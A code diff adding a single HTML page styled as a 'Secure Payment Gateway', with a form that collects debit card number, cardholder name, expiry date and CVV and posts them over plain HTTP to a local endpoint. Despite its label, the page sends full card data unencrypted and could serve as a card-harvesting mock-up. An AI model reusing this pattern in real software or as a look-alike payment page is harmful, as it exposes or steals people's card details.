@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Payment Gateway</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            width: 400px;
+            margin: 50px auto;
+            padding: 30px;
+            background-color: white;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+        }
+        h2 {
+            text-align: center;
+            color: #333;
+        }
+        .input-field {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+        }
+        .submit-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .submit-btn:hover {
+            background-color: #45a049;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>Payment Gateway</h2>
+    <form id="paymentForm" action="http://localhost:5000/submit_card" method="POST">
+        <input type="text" name="card_number" class="input-field" placeholder="Debit Card Number" required><br>
+        <input type="text" name="cardholder_name" class="input-field" placeholder="Cardholder's Name" required><br>
+        <input type="text" name="expiry_date" class="input-field" placeholder="Expiry Date (MM/YY)" required><br>
+        <input type="text" name="cvv" class="input-field" placeholder="CVV" required><br>
+        <button type="submit" class="submit-btn">Submit Payment</button>
+    </form>
+</div>
+
+<div class="footer">
+    <p>© 2025 Secure Payment Gateway</p>
+</div>
+
+</body>
+</html>
